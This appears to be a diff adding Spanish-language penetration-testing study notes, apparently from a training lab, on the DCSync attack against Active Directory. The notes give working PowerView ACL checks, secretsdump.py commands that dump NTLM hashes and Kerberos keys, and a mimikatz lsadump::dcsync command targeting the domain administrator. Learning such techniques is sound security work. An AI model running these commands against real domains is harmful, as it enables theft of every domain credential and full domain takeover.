@@ -1,0 +1,35 @@
+DCsync es una técnica que nos permite robar la password de la contraseña de la DB del AD. Esto nos permite impersonar un DC par traer los hashes.
+Se logra usando el  Directory Replication Service Remote Protocol para replicar la data de un DC.
+EL ki de la cuestión es pedirle al DC que replique los paswords mediante el DS-Replication-Get-Changes-All
+Para realizar este ataque necesitamos tener un user con los permisos: Replicating Directory Changes y Replicating Directory Changes All
+Los domain/enterprise admins y los default domain administrators los tienen por default.
+
+Conseguir el SID de un usuario:
+Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl
+
+SID viene en el parámetro "objectsid"
+
+Luego recorremos las ACL para ver si nuestro user tiene permisos de replicación en los objectacetype:
+$sid= "<SID>"
+Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
+
+SI tenemos permsos sobre el usuario como WriteDacl podemos agregar este privilegio a un user bajo nuestro control.
+
+#######Extraer los hashes NTLM y Kerberos Keys usando secretsdump:
+
+######linux
+secretsdump.py -outputfile <file_a_exportar> -just-dc <dc>/<user>@<dc_ip>
+esto va a crear 3 archivos: uno con los hashes ntlm, otro con los kerberos y otro con los cleartext para los users que tengan habilitada el "reversible encryption"
+
+Podemos también usar varias flags para extraer datos u objetivos puntuales:
+-just-dc-ntlm
+-just-dc-user <USERNAME>
+
+#################################mimikatz para hacer DCsync
+Debemos correr mimikatz con la cuenta que tiene los privilegios requeridos. Para loguearnos podemos hacerlo desde el cmd con runas.exe:
+runas /netonly /user:INLANEFREIGHT\adunn powershell
+
+luego corremos mimikatz.exe
+
+lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
+
